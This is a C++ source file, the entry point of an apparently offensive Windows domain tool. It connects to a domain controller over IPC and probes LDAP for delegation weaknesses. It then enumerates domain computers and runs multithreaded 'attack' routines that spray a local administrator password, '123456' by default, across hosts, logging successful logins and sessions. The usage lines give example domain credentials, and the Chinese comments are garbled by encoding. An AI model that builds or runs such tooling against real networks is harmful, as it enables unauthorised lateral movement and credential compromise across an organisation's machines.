#include "WNetApi.h"
#include "CommonApi.h"
#include "multiThread.h"
#include "LdapApi.h"

int wmain(int argc, wchar_t * argv[])
{
	clock_t start, finish;
	double time;
	start = clock();
	

	setlocale(LC_ALL, "");							// ��������
    if (argc != 7) {
        wprintf(L"Usage: %s <DC-IP> <DC> <domainname\\username> <password> <nbpassword> <t_num>\n", argv[0]);
		wprintf(L"       %s \\\\���IP ����� ����\\���û� ���û����� ����administratorͨ������ ���߳���Ŀ\n", argv[0]);
        wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei NULL 123456 1\n", argv[0]);
		wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\LiWei-PC$ NULL 123456 1\n", argv[0]);
		wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei lw123!@#45 123456 1\n", argv[0]);
		wprintf(L"       �����ǰ�û������û�����û�и����û������룬��password����NULL�������ǰ�û����������systemȨ�ޣ����û���Ϊ��������password����NULL�����û�б���administratorͨ�����룬��nbpassword����123456\n", argv[0]);
		
        exit(1);
    }

	CommonApi theCommonApi;
	WNetApi theWNetApi;

	LPWSTR lpRemoteName = argv[1];
	LPWSTR lpDCName = argv[2];							// hack.local
	LPWSTR lpDomainUserName = argv[3];					// hack\iis_user
	LPWSTR lpDomainUserPassword = argv[4];
	LPCWSTR lpNbPassword = argv[5];						// ͨ������
	LPCWSTR lpThreadNum = argv[6];

	std::vector<std::wstring> aaa;					// ���봴��vector�����ı���ȥ����splitString���ص�ֵ����Ȼȡ�������ݻ�����
	aaa = theCommonApi.splitString(lpDomainUserName, L"\\");
	LPCWSTR lpDomainName = aaa[0].c_str();			// ȡ������  eg:hack
	LPCWSTR lpUserName = aaa[1].c_str();			// ���û���	eg:iis_user

	int iThreadNum;
	iThreadNum = atoi(theCommonApi.UnicodeToAnsi(lpThreadNum));
	
	HANDLE hAliveFile = theCommonApi.CreateFileApi(L"alive.txt");				// ���������
	HANDLE hLocalFile = theCommonApi.CreateFileApi(L"local.txt");				// ���������ı��ع�����
	HANDLE hSuccessFile = theCommonApi.CreateFileApi(L"success.txt");			// �ɹ�����IPC���ӵ���������˺�����
	HANDLE hNetSessionsFile = theCommonApi.CreateFileApi(L"NetSessions.txt");	// ÿ̨�������net sessions
	HANDLE hDelegFile = theCommonApi.CreateFileApi(L"Deleg.txt");				// ί��©��




	std::vector<std::wstring> stdPasswordList;				// ������������

	// �����ǰ�û������û������޸����û������룬��ô�ͽ������û���������ΪNULL
	if (CompareString(GetThreadLocale(), NORM_IGNORECASE, lpDomainUserPassword, lstrlenW(lpDomainUserPassword), L"NULL", lstrlenW(L"NULL")) == CSTR_EQUAL)
	{
		lpDomainUserPassword = NULL;
	}
	

	// ���ñ��ط�administrator����Ա�û���������Ϊ123456
	int iComp = CompareString(GetThreadLocale(), NORM_IGNORECASE, lpNbPassword, lstrlenW(lpNbPassword), L"123456", lstrlenW(L"123456"));
	if (iComp != CSTR_EQUAL)		// �����
	{
		stdPasswordList.push_back(lpNbPassword);				// ����administrator�û���������
		stdPasswordList.push_back(L"123456");
	}
	else {
		stdPasswordList.push_back(L"123456");
	}
	



    wprintf(L"Calling WNetAddConnection2 with\n");
    wprintf(L"  lpDomainName = %s\n", lpDomainName);
    wprintf(L"  lpRemoteName = %s\n", lpRemoteName);
    wprintf(L"  lpDomainUserName = %s\n", lpDomainUserName);
    wprintf(L"  lpDomainUserPassword = %s\n", lpDomainUserPassword);
	wprintf(L"  passwordList = %s\n", lpNbPassword);

	int retNetUse;
	retNetUse = theWNetApi.WNetAddConnection2Api(lpRemoteName, lpDomainUserName, lpDomainUserPassword);			// ����ؽ���IPC����
	if (retNetUse == 0)
	{
		wprintf(L"net use %s error: %d\n", lpRemoteName, GetLastError());
		exit(0);
	}

	// ���ί��©����������Դ��Լ��ί�ɣ�
	if (lpDomainUserPassword != NULL){
		wprintf(L"------------------------------------check delegationVul...------------------------------------\n");
		LdapApi theLdapApi(lpDCName, (PWCHAR)lpUserName, (PWCHAR)lpDomainUserPassword, hDelegFile);
		int iConnRet = theLdapApi.connect();
		if (iConnRet != 1) {
			exit(0);
		}
		theLdapApi.RBCD();
		theLdapApi.CD();
		theLdapApi.ud();
	}


	
	// ��ȡ������б�
	std::vector<std::wstring> hostnameList;
	hostnameList = theWNetApi.NetGroupGetUsersApi(lpRemoteName, L"Domain Computers");

	wprintf(L"------------------------------------start attack...------------------------------------\n");

	multiThread theMultiThread(lpDomainUserName, lpDomainUserPassword, stdPasswordList, hAliveFile, hLocalFile, hSuccessFile, hNetSessionsFile);		// ʵ�������߳���
	
	std::thread * threads = new std::thread[iThreadNum];	// ��̬����

	for (int i = 0; i < iThreadNum; i++)
		threads[i] = std::thread(&multiThread::attack, theMultiThread, i, &hostnameList);

	for (int i = 0; i < iThreadNum; i++)
		threads[i].join();

	delete[] threads;

	finish = clock();												//ִ����֮���CPUʱ��ռ��ֵ
	time = (double)(finish - start) / (double)CLOCKS_PER_SEC;		//����ʱ�䣬��λ����
	printf("%lf s\n", time);		//���
}